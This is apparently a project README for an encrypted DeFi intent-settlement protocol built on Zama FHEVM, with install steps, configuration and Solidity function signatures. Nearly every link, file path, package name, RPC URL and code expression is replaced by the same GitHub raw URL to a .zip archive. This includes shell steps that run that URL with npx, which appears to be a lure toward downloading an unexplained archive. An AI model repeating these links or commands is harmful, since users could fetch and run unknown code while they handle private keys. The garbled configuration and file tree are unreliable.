# Encrypted Cross-Chain Intent Settlement Protocol

A privacy-preserving DeFi protocol built with [Zama FHEVM](https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip) (Fully Homomorphic Encryption) where users create encrypted swap intents and solvers compete blindly to fill them.

## 🔒 Key Innovation

**First encrypted intent protocol in the Zama ecosystem** - All sensitive data (swap amounts, exchange rates, chain selections, and deadlines) remain fully encrypted on-chain using FHE. This solves the MEV problem by enabling blind bidding where solvers cannot see competitors' offers or users' minimum acceptable rates.

## 📋 Features

### Smart Contract (Solidity 0.8.24)
- **EncryptedIntent**: Stores swap intents with TFHE encrypted types (`euint64` for amounts, `euint8` for chain IDs)
- **EncryptedOffer**: Solvers submit encrypted rates and fees that remain private
- **Blind Matching**: MVP accepts first offer (full comparison requires Gateway integration)
- **Access Control**: Proper TFHE permission management for contract and users

### Frontend (React + TypeScript)
- **Dual Interface**: Separate tabs for Users (create intents) and Solvers (submit offers)
- **Wallet Integration**: RainbowKit with custom Zama Devnet configuration (chainId: 8009)
- **FHE Encryption**: Client-side encryption using `fhevmjs` before submission
- **Real-time Dashboard**: View active intents, offer counts, and match status
- **Privacy Indicators**: Visual encryption badges (🔒) throughout the UI
- **Responsive Design**: Mobile-first with gradient backgrounds and smooth animations

## 🚨 Important Limitations (MVP)

### Gateway Integration Required
This MVP demonstrates the encrypted intent architecture but has the following limitations:

1. **Encryption Flow**: The current implementation uses `https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip` which produces client-side encrypted handles. For production deployment to Zama Devnet, proper **Gateway integration** is required to generate valid `einput` handles with cryptographic proofs.

2. **Matching Logic**: The MVP accepts the first offer without encrypted comparison. Full offer comparison using `https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip()` and `https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip()` requires Gateway decryption capabilities.

3. **No Token Transfers**: This MVP focuses on the intent/offer mechanism. Actual ERC20 token transfers are not implemented.

### What Works
- ✅ Smart contract compiles successfully with fhevm@0.5.8
- ✅ Frontend wallet connection and UI flow
- ✅ Design system with encryption indicators
- ✅ Component architecture for intent creation and offer submission

### Production Requirements
To deploy to Zama Devnet, you would need to:
- Implement Gateway relayer integration for proper `einput` generation
- Add TFHE permissions for Gateway address
- Implement offer comparison logic with Gateway decryption
- Add ERC20 token transfer mechanisms
- Comprehensive end-to-end testing on actual devnet

## 🛠 Tech Stack

**Blockchain:**
- Hardhat 2.26+ with TypeScript
- Solidity 0.8.24 (Cancun EVM)
- fhevm@0.5.8 (Zama FHE library)
- https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip v6
- TypeChain for type-safe contract interactions

**Frontend:**
- React 18.3 with TypeScript
- RainbowKit 2.0.2 for wallet connection
- Wagmi 2.5.7 for Ethereum interactions
- Viem 2.7.15 for blockchain utilities
- fhevmjs 0.5.0 for client-side FHE encryption
- TanStack Query for state management
- Tailwind CSS with custom DeFi design system
- Lucide React for icons

## 📦 Installation

```bash
# Install dependencies
npm install

# Compile smart contracts
npx hardhat compile

# Export contract ABI
npx tsx https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip

# Start development server
npm run dev
```

## 🔧 Configuration

### Hardhat (https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip)
```javascript
networks: {
  zamaDevnet: {
    url: "https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip",
    chainId: 8009,
    accounts: https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip ? [https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip] : [],
  }
}
```

### Frontend (https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip)
Update `CONTRACT_ADDRESS` after deployment:
```typescript
export const CONTRACT_ADDRESS = "0x..."; // Your deployed contract address
```

## 📁 Project Structure

```
├── contracts/
│   └── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip    # Main FHE smart contract
├── scripts/
│   ├── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip                       # Deployment script
│   └── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip                   # ABI export utility
├── client/
│   └── src/
│       ├── components/
│       │   ├── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip        # User intent creation form
│       │   ├── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip         # Solver offer submission
│       │   ├── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip          # Dashboard component
│       │   └── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip              # Wallet connection
│       ├── lib/
│       │   ├── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip               # FHE encryption helpers
│       │   ├── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip               # Wagmi configuration
│       │   └── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip           # Contract ABI & address
│       └── pages/
│           └── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip               # Main page with tabs
└── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip                 # Hardhat configuration
```

## 🎨 Design System

- **Primary Color**: `hsl(239 84% 67%)` - Trustworthy blue
- **Secondary Color**: `hsl(262 83% 58%)` - Premium purple
- **Success Color**: `hsl(142 76% 36%)` - Encryption green
- **Fonts**: Inter (body), Space Grotesk (headings)
- **Gradients**: Blue → Purple → Pink backgrounds
- **Icons**: Lock symbols for encrypted fields

## 🔐 Smart Contract API

### Core Functions

```solidity
// Create encrypted intent (user)
function createIntent(
    einput encryptedTokenIn,
    einput encryptedMinOut,
    einput encryptedSourceChain,
    einput encryptedDestChain,
    bytes calldata inputProof
) external returns (uint256 intentId)

// Submit encrypted offer (solver)
function submitOffer(
    uint256 intentId,
    einput encryptedRate,
    einput encryptedFee,
    bytes calldata inputProof
) external

// Match intent with first offer (anyone)
function matchIntent(uint256 intentId) external
```

### View Functions

```solidity
function isIntentActive(uint256 intentId) external view returns (bool)
function getOfferCount(uint256 intentId) external view returns (uint256)
function getIntentCreator(uint256 intentId) external view returns (address)
function getIntentTimestamp(uint256 intentId) external view returns (uint256)
```

## 🚀 Deployment

```bash
# Set private key
export PRIVATE_KEY="0x..."

# Deploy to Zama Devnet
npx hardhat run https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip --network zamaDevnet

# Update CONTRACT_ADDRESS in https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip
```

## 🧪 Testing

```bash
# Compile contracts
npx hardhat compile

# Run tests (when implemented)
npx hardhat test

# Start local development
npm run dev
```

## 📚 Resources

- [Zama FHEVM Documentation](https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip)
- [TFHE Operations](https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip)
- [fhevmjs NPM Package](https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip)
- [Zama Devnet](https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip)

## 📝 License

MIT

## 🙏 Acknowledgments

Built using [Zama's FHEVM](https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip) - pioneering Fully Homomorphic Encryption for blockchain.

---

**Note**: This is an MVP demonstration. Production deployment requires Gateway integration for proper encryption/decryption flows on Zama Devnet.
